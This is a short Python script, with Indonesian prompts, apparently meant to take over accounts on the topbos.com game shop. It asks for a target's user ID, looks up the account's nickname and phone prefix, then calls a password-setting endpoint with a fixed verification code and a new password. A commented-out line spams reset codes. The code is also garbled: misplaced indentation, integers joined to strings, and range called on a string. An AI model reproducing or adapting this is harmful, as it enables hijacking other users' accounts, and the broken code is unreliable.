import requests,time,os,sys,json

def name(kata):
    for k in kata+"\n":
        sys.stdout.write(k)
        sys.stdout.flush()
        time.sleep(.9/10)

        if __name__ == "__main__":
            os.system("clear")
            userId = input("Masukkan ID Target: ")
            response = requests.get("https://www.topbos.com/web/shopIndex.do?userId="+userId)
            log = response.json()
            name = requests.get("https://www.topbos.com/web/infullRequest.do?userId="+userId+"&costKey=com.neptune.download.coincard0066&infullType=9&version=1.66")
            nick = name.json()
            print("Proses Login ke Akun"+str(nick["message"]["nickname"]))

        if log["message"][5:7] == "08":
            nomor = log["message"][5:7]
            print("Login Berhasil")
            print(nomor)

            newpass = input("Masukkan Password Baru: ")
            response = requests.get("https://www.topbos.com/web/setPwdPage.do?userId="+userId+"&preBindPhone="+nomor+"&code="+2347+"&secondPwd="+newpass+"sendCodeFlag="+0)
            log2 =response.json()
            if log2["code"] == "0":
                for i in range("0.3"):
                    #response = requests.get("https://topbos.com/shop/sendPwdCodeIndex.do?userId="+userId+"&preBindPhone="+nomor)
                   #print("proses Spam Ke :"+str(i))
                    print("Password Berhasil di Ganti")

                else:
                    print(log2["message"])

            else:
                print(log["message"])
